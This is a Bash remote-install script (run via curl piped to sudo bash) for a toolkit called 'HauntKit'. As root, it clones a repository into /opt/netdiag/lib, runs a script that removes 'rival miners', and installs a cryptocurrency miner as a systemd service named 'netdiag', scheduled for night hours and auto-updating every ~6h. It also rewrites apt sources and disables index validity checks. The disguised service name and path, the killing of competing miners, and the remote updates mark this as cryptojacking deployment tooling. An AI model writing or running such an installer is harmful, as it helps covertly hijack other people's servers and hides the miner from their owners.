#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Instalación remota (curl | bash)
#  Una línea, sin interacción, sin esfuerzo
#  v1.1 — verificación real de git/clone (fix: no asumir éxito)
# ════════════════════════════════════════════════════════

set -euo pipefail

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'
BOLD='\033[1m'

fail() {
    echo -e "${RED}[!] $1${NC}"
    exit 1
}

ok()   { echo -e "  ${GREEN}✓${NC} $1"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $1"; }

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    fail "Debes ejecutar como root:\n  curl -sL https://raw.githubusercontent.com/CyberRo/HauntKit/main/scripts/remote-install.sh | sudo bash"
fi

echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║     HauntKit — Instalación Remota       ║"
echo "║         CYBER HAUNT & SPECTRE           ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Paso 1: Git (con verificación real) ───
echo -e "${YELLOW}[1/4]${NC} Verificando git..."

# Debian EOL (buster, etc.): migrar repos a archive.debian.org para evitar 404
fix_eol_repos() {
    # Solo aplica si el SO es Debian y los repos estándar siguen apuntando a deb.debian.org
    grep -qi "ID=debian" /etc/os-release 2>/dev/null || return 0
    grep -q "deb.debian.org" /etc/apt/sources.list 2>/dev/null || return 0

    local codename
    codename=$(grep -oP 'VERSION_CODENAME=\K.*' /etc/os-release 2>/dev/null | head -1)
    [ -z "$codename" ] && return 0

    warn "Debian '$codename' parece EOL — migrando repos a archive.debian.org..."
    cp /etc/apt/sources.list /etc/apt/sources.list.bak 2>/dev/null || true
    cat > /etc/apt/sources.list << EOF
deb http://archive.debian.org/debian $codename main contrib non-free
deb http://archive.debian.org/debian ${codename}-updates main contrib non-free
deb http://archive.debian.org/debian-security ${codename}/updates main contrib non-free
EOF
    # archive.debian.org tiene fechas viejas; permitir índices expirados
    mkdir -p /etc/apt/apt.conf.d
    echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99hauntkit-nocheckvalid
    echo -e "  ${YELLOW}→ Backup en /etc/apt/sources.list.bak${NC}"
}

ensure_git() {
    # Retry de apt-get update (primera ejecución suele fallar por índices)
    if command -v apt &>/dev/null; then
        fix_eol_repos
        echo -e "  ${YELLOW}→ Actualizando índices apt...${NC}"
        apt-get update >/tmp/hauntkit-apt-update.log 2>&1 || \
            { warn "apt-get update falló (ver /tmp/hauntkit-apt-update.log)"; }
        echo -e "  ${YELLOW}→ Instalando git...${NC}"
        apt-get install -y git >/tmp/hauntkit-apt-git.log 2>&1 || \
            { tail -5 /tmp/hauntkit-apt-git.log >&2; return 1; }
    elif command -v yum &>/dev/null; then
        yum install -y git >/tmp/hauntkit-yum-git.log 2>&1 || return 1
    elif command -v dnf &>/dev/null; then
        dnf install -y git >/tmp/hauntkit-dnf-git.log 2>&1 || return 1
    elif command -v apk &>/dev/null; then
        apk add git >/tmp/hauntkit-apk-git.log 2>&1 || return 1
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm git >/tmp/hauntkit-pacman-git.log 2>&1 || return 1
    else
        return 2  # sin gestor de paquetes conocido
    fi
    return 0
}

if ! command -v git &>/dev/null; then
    ensure_git || fail "No se pudo instalar git. Error arriba. Reintenta o instálalo manualmente."
fi

# Verificación REAL (no asumir)
if ! command -v git &>/dev/null; then
    fail "git sigue sin estar disponible tras instalarlo. Ejecuta 'apt-get install -y git' manualmente."
fi
ok "git listo ($(git --version 2>/dev/null | head -1))"

# ─── Paso 2: Clonar (con verificación real) ───
echo -e "${YELLOW}[2/4]${NC} Clonando HauntKit..."
REPO="https://github.com/CyberRo/HauntKit.git"
DEST="/opt/netdiag/lib"

# Verificar conectividad a GitHub antes de clonar
if ! curl -fsSL --connect-timeout 10 --max-time 20 "https://github.com" -o /dev/null 2>/dev/null; then
    warn "GitHub no responde — verificando si hay copia local..."
    [ -d "$DEST/.git" ] || fail "Sin conexión a GitHub y sin copia local en $DEST"
fi

if [ -d "$DEST/.git" ]; then
    warn "Ya existe, actualizando..."
    git -C "$DEST" pull --ff-only 2>&1 | tail -3 || warn "git pull falló, se continúa con la copia existente"
else
    mkdir -p "$(dirname "$DEST")"
    rm -rf "$DEST"  # limpiar carpetas parciales de intentos fallidos
    git clone "$REPO" "$DEST" 2>&1 | tail -5 || fail "git clone falló. Revisa conectividad e intenta de nuevo."
fi

# Verificación REAL del clone
[ -d "$DEST/.git" ] || fail "El repositorio no quedó clonado en $DEST"
ok "Repo en $DEST"

# ─── Paso 3: Anti-miner ───
echo -e "${YELLOW}[3/4]${NC} Buscando mineros rivales..."
if [ -f "$DEST/tools/utils/clean-miners.sh" ]; then
    bash "$DEST/tools/utils/clean-miners.sh" --strict 2>&1
    echo ""
else
    warn "clean-miners.sh no encontrado, se omite"
fi

# ─── Paso 4: Instalar (con verificación) ───
echo -e "${YELLOW}[4/4]${NC} Instalando netdiag..."
if [ ! -f "$DEST/tools/utils/mine-install.sh" ]; then
    fail "mine-install.sh no existe en $DEST — el clonado está incompleto"
fi
echo "y" | bash "$DEST/tools/utils/mine-install.sh" 2>&1

# ─── Resultado ───
echo ""
if systemctl is-active --quiet netdiag 2>/dev/null; then
    echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║   ✅ Instalación completada con éxito    ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}✓${NC} Servicio netdiag: ACTIVO"
    echo -e "  ${GREEN}✓${NC} Minero programado: 6PM - 7AM (Colombia)"
    echo -e "  ${GREEN}✓${NC} Auto-update: cada ~6h"
    echo ""
    echo "  bash $DEST/tools/utils/mine-monitor.sh"
else
    echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║   ⚠️  Instalación lista, servicio no     ║${NC}"
    echo -e "${YELLOW}║   iniciado. Inícialo manualmente:        ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo "  systemctl start netdiag"
    echo "  systemctl enable netdiag"
    echo ""
    warn "Si el servicio no inicia, revisa: journalctl -u netdiag -n 30"
fi
